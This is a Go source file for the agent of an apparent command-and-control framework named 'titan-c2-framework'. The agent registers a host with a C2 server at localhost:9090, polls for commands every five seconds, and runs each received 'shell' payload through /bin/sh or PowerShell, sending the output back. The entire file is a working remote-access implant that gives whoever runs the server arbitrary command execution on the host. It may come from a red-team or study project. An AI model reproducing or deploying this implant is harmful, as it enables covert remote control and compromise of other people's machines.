package main

import (
	"context"
	"fmt"
	"log"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"

	"github.com/user/titan-c2-framework/pkg/pb"
	"github.com/user/titan-c2-framework/pkg/transport"
)

const (
	C2Address = "localhost:9090"
	SleepTime = 5 * time.Second
)

var AgentID string

func main() {
	conn, err := transport.Connect(C2Address, false)
	if err != nil {
		log.Fatal(err)
	}
	defer conn.Close()

	client := pb.NewC2ServiceClient(conn)

	// Register
	hostname, _ := os.Hostname()
	resp, err := client.Register(context.Background(), &pb.RegisterRequest{
		Hostname: hostname,
		Os:       runtime.GOOS,
		Arch:     runtime.GOARCH,
		Ip:       "192.168.1.10", // Mock IP for now
	})
	if err != nil {
		log.Fatalf("Registration failed: %v", err)
	}
	AgentID = resp.AgentId
	fmt.Printf("Registered as Agent ID: %s\n", AgentID)

	// Main Loop
	for {
		hb, err := client.Heartbeat(context.Background(), &pb.HeartbeatRequest{
			AgentId: AgentID,
		})
		if err != nil {
			log.Printf("Heartbeat failed: %v", err)
			time.Sleep(SleepTime)
			continue
		}

		if len(hb.Commands) > 0 {
			for _, cmd := range hb.Commands {
				processCommand(client, cmd)
			}
		}

		time.Sleep(SleepTime)
	}
}

func processCommand(client pb.C2ServiceClient, cmd *pb.Command) {
	fmt.Printf("Received command: %s %s\n", cmd.Type, cmd.Payload)
	
	var output string
	var errStr string

	switch cmd.Type {
	case "shell":
		out, err := runShell(cmd.Payload)
		output = string(out)
		if err != nil {
			errStr = err.Error()
		}
	default:
		errStr = "Unknown command type"
	}

	_, err := client.SubmitResult(context.Background(), &pb.CommandResult{
		AgentId:   AgentID,
		CommandId: cmd.CommandId,
		Output:    output,
		Error:     errStr,
	})
	if err != nil {
		log.Printf("Failed to submit result: %v", err)
	}
}

func runShell(command string) ([]byte, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("powershell", "-Command", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}
	return cmd.CombinedOutput()
}
